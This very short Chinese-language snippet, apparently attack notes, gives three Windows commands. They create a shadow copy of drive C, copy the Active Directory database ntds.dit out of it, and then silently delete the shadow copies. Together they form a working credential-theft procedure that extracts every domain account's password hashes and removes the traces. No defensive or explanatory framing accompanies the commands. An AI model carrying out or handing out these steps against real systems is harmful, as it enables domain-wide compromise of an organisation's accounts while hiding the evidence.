	创建C盘卷影拷贝
	>vssadmin create shadow /for=c:
	复制ntds.dit
	>copy {Shadow Copy Volume Name}\windows\NTDS\ntds.dit c:\ntds.dit
	删除拷贝
	>vssadmin delete shadows /for=c: /quiet